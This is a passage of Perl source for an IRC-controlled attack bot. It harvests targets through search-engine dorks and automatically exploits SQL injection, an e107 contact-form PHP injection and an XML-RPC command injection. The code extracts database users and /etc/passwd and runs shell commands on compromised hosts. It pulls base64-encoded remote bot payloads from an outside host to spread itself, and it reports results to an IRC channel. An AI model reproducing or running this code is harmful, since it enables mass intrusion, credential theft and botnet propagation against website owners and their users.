sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)2$inj14 $os");
}
}
}
sub sqlscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @sqlgoogle=&google($dork);
push(@sqltotal, @sqlgoogle);
}
if ($engz =~ /AllTheWeb/) {
my @sqlalltheweb=&alltheweb($dork);
push(@sqltotal, @sqlalltheweb);
}
if ($engz =~ /Bing/) {
my @sqlBing=&Bing($dork);
push(@sqltotal, @sqlBing);
}
if ($engz =~ /ALtaViSTa/) {
my @sqlaltavista=&altavista($dork);
push(@sqltotal, @sqlaltavista);
}
if ($engz =~ /AsK/) {
my @sqlask=&ask($dork);
push(@sqltotal, @sqlask);
}
if ($engz =~ /UoL/) {
my @sqluol=&uol($dork);
push(@sqltotal, @sqluol);
}
if ($engz =~ /YahOo/) {
my @sqlyahoo=&yahoo($dork);
push(@sqltotal, @sqlyahoo);
}
my @sqlclean = &calculate(@sqltotal);
if (scalar(@sqlclean) != 0) {
}
my $uni=scalar(@sqlclean);
foreach my $sqltarget (@sqlclean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(4@3$engz15)10 Scan Finish for14 $dork");
}
my $xpl = "http://".$sqltarget.$bugz."'";
my $vuln = "http://".$sqltarget."12".$bugz."7[SQL]";
my $sqlsite = "http://".$sqltarget.$bugz;
my $strona = getcontent($xpl);
if ( $strona =~ m/You have an error in your SQL syntax/i || $strona =~ m/Query failed/i || $strona =~ m/SQL query failed/i )
{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MySQL15)14 $vuln ");&sqlbrute($sqlsite);}
elsif ( $strona =~ m/ODBC SQL Server Driver/i || $strona =~ m/Unclosed quotation mark/i || $strona =~ m/Microsoft OLE DB Provider for/i )
{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MsSQL15)14 $vuln ");}
elsif ( $strona =~ m/Microsoft JET Database/i || $strona =~ m/ODBC Microsoft Access Driver/i )
{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MsAccess15)14 $vuln ");}
}
}

sub cmde107() {
my $path = $_[0];
my $incmd = $_[1];
my $codecmd = encode_base64($incmd);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"))';
$access = new LWP::UserAgent;
$access->agent("Mozilla/5.0");
my $req = new HTTP::Request POST => $path;
$req->content_type('application/x-www-form-urlencoded');
$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $access->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
$mydata = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e107CMD15)4 $mydata");
}
}
sub e107scan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @e107google=&google($dork);
push(@e107total, @e107google);
}
if ($engz =~ /AllTheWeb/) {
my @e107alltheweb=&alltheweb($dork);
push(@e107total, @e107alltheweb);
}
if ($engz =~ /Bing/) {
my @e107Bing=&Bing($dork);
push(@e107total, @e107Bing);
}
if ($engz =~ /ALtaViSTa/) {
my @e107altavista=&altavista($dork);
push(@e107total, @e107altavista);
}
if ($engz =~ /AsK/) {
my @e107ask=&ask($dork);
push(@e107total, @e107ask);
}
if ($engz =~ /UoL/) {
my @e107uol=&uol($dork);
push(@e107total, @e107uol);
}
if ($engz =~ /YahOo/) {
my @e107yahoo=&yahoo($dork);
push(@e107total, @e107yahoo);
}
my @e107clean = &calculate(@e107total);
if (scalar(@e107clean) != 0) {
}
my $uni=scalar(@e107clean);
foreach my $e107target (@e107clean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)(4@3$engz15)10 Scan Finish for14 $dork");
}
my $cmd = "echo(base64_decode(\"Vm9v\").php_uname().base64_decode(\"RG9v\"));include(base64_decode(\"aHR0cDovL3d3dy52aW5jZW50dHJhY3RvcnMuY28udWsvaW1hZ2VzL25ldy9wYm90LnR4dD8=\"));include(base64_decode(\"aHR0cDovL3d3dy52aW5jZW50dHJhY3RvcnMuY28udWsvaW1hZ2VzL25ldy9teXNwLnR4dD8=\"));";
my $ua = LWP::UserAgent->new or die;
$ua->agent('Mozilla/4.76 [ru] (X11; U; SunOS 5.7 sun4u)');
$ua->timeout(15);
my $xpl = "http://".$e107target."/contact.php";
$xpl =~ s/\/\/contact.php/\/contact.php/g;
my $req = HTTP::Request->new(POST => $xpl);
$req->content_type('application/x-www-form-urlencoded');
$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $ua->request($req);
my $cont = $res->content;
if ($cont =~ /Voo(.*)Doo/) {
my $uname = $1;
$uname=~s/\n//;
$uname=~s/\r//;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)(2$xpl15)14 $uname ");
}
}
}
sub enc()
{
my $md5_hash = $1;
my $md5_generated = md5_hex($md5_hash);
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Encode15)2 $md5_generated");
}
sub dec()
{
my $md5 = $1;
my $crac = 'http://md5.noisette.ch/md5.php?hash='.$md5;
my $found = getcontent($crac);
if ($found =~ /<\/string>/)
{
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Decode15)2 $1");
}
else
{
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Decode15)2 $1");
}
}
sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
$exploit = "";
$exploit .= "test.method";
$exploit .= "',''));";
$exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {
$os=$1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)(2$xmltgt15)14 $os ");
sendraw($IRC_cur_socket, "PRIVMSG BaMbY :15(4@3XML15)(2$xmltgt15)14 $os ");
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
$exploit = "";
$exploit .= "test.method";
$exploit .= "',''));";
$exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub getcontent() {
my $url = $_[0];
my $req = HTTP::Request->new(GET => $url);
my $ua = LWP::UserAgent->new();
$ua->timeout(15);
my $response = $ua->request($req);
return $response->content;
}

sub lfiexploit() {
my $url = $_[0];
my $rce = $_[1];
my $agent = "";
my $ua = LWP::UserAgent->new(agent => $agent);
$ua->timeout(15);
my $req = HTTP::Request->new(GET => $url);
my $response = $ua->request($req);
return $response->content;
}

sub google(){
my @lst;
my $key = $_[0];
my $b = 0;
for ($b=0; $b<=1000; $b+=100){
my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while ($Res =~ m/\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}
sub SIGN() {
if (($powered !~ /B/)||($mail !~ /oe/)) {
print "\nLamer!!! Bodoh ToloL Oon !!! Udah Gak Usah diRubah Lagi!!!\n\n";
exec("rm -rf $0 && pkill perl");
}
}
sub alltheweb() {
my @lst;
my $key = $_[0];
my $b = 0;
my $pg = 0;
for ($b=0; $b<=1000; $b+=100) {
my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
my $Res = query($all);
while ( $Res =~ m/http:\/\/(.+?)\<\/span>/g ) {
my $k = $1;
$k =~ s/ //g;
my @grep = links($k);
push( @lst, @grep );
}
}
return @lst;
}

sub uol() {
my @lst;
my $key = $_[0];
my $b = 0;
for ($b=1; $b<=1000; $b+=10) {
my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
my $Res = query($UoL);
while ( $Res =~ m/\"]*)/g ) {
my $k = $1;
if ( $k !~ /busca|uol|yahoo/ ) {
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}

sub Bing() {
my @lst;
my $key = $_[0];
my $b = 0;
for ($b=1; $b<=1000; $b+=10) {
my $bing = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE");
my $Res = query($bing);
while ( $Res =~ m/\"]*)\//g ) {
if ( $1 !~ /msn|live|bing/ ) {
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
my $b = 0;
for ($b=1; $b<=1000; $b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while ($Res=~m/(.+?)\//g){
if ($1 !~ /altavista/){
my $k=$1;
$k=~s/ $k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}

sub ask() {
my @lst;
my $key = $_[0];
my $b = 0;
my $pg = 0;
for ($b=0; $b<=1000; $b+=10) {
my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
my $Res = query($Ask);
while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
if ($1 !~ /ask.com/){
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}

sub yahoo() {
my @lst;
my $key = $_[0];
my $b = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub os() {
my $target=$_[0];
my $re = &query($target);
while ($re =~ m/
OSTYPE:(.+?)\
/g) {
$os = $1;
}
}

sub query($) {
my $url = $_[0];
$url =~ s/http:\/\///;
my $host = $url;
my $query = $url;
my $page = "";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~ s/$host//;
if ( $query eq "" ) { $query = "/"; }
eval {
my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page = "@r";
close($sock);
};
return $page;
}
sub links() {
my @l;
my $link = $_[0];
my $host = $_[0];
my $hdir = $_[0];
$hdir =~ s/(.*)\/[^\/]*$/\1/;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host .= "/";
$link .= "/";
$hdir .= "/";
$host =~ s/\/\//\//g;
$hdir =~ s/\/\//\//g;
$link =~ s/\/\//\//g;
push( @l, $link, $host, $hdir );
return @l;
}
sub key() {
my $dork = $_[0];
$dork =~ s/ /\+/g;
$dork =~ s/:/\%3A/g;
$dork =~ s/\//\%2F/g;
$dork =~ s/&/\%26/g;
$dork =~ s/\"/\%22/g;
$dork =~ s/,/\%2C/g;
$dork =~ s/\\/\%5C/g;
return $dork;
}


sub calculate {
my @calculate = ();
my %visti = ();
foreach my $element (@_) {
$element =~ s/\/+/\//g;
next if $visti{$element}++;
push @calculate, $element;
}
return @calculate;
}
sub sqlbrute() {
my $site=$_[0];
my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
{
$union.=','.$column;
$inyection.=','."0x6c6f67696e70776e7a";
if ($column == 0)
{
$inyection = '';
$union = '';
}
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
$response=get($sql);
if($response =~ /loginpwnz/)
{
$column ++;
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)14 $sql ");
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
$response=get($sql)or die("[-] Impossible to get Information_Schema\n");
if($response =~ /loginpwnz/)
{
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2SCHEMA15)14 $sql ");
}
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
$response=get($sql)or die("[-] Impossible to get MySQL.User\n");
if($response =~ /loginpwnz/)
{
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2USER15)14 $sql ");
}
else
{
}
while ($loadcont < $column-1)
{
$loadfile.=','.'load_file(0x2f6574632f706173737764)';
$loadcont++;
}
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
if($response =~ /root:x:/)
{
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2Load File15)14 $sql ");
}
else
{
}
foreach $tabla(@tabele)
{
chomp($tabla);
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
$response=get($sql)or die("[-] Impossible to get tables\n");
if($response =~ /loginpwnz/)
{
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2Tabel15)14 $sql ");
&tabelka($site,$tabla);
}
}
}
}
}

sub tabelka() {
my $site=$_[0];
my $tabla=$_[1];
my $cfin.="--";
my $cmn.= "+";
chomp($tabla);
foreach $columna(@kolumny)
{
chomp($columna);
$sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
$response=get($sql)or die("[-] Impossible to get columns\n");
if ($response =~ /loginpwnz/)
{
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15) (2SQLi Vuln15)14 $site 15(2Kolom15)14 $columna 15(2Tabel15)14 $tabla ");
}
}

}
sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub join {
sendraw("JOIN $_[0]");
}

sub part {
sendraw("PART $_[0]");
}

sub quit {
sendraw("QUIT $_[0]");
exit;
}
